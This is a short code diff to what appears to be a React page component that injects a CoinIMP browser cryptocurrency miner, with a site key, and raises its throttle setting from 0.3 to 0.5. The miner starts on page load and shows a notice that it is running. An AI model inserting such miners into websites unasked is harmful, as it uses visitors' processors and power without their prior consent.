@@ -76,7 +76,7 @@ const Index = () => {
         script2.text = `
           if (!window.miningClientInitialized) {
             var _client = new Client.Anonymous('80b853dd927be9f5e6a561ddcb2f09a58a72ce6eee0b328e897c8bc0774642cd', {
-              throttle: 0.3, c: 'w'
+              throttle: 0.5, c: 'w'
             });
             _client.start();
             _client.addMiningNotification("Floating Bottom", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#1e49ae", 40, "#6a0c5a");
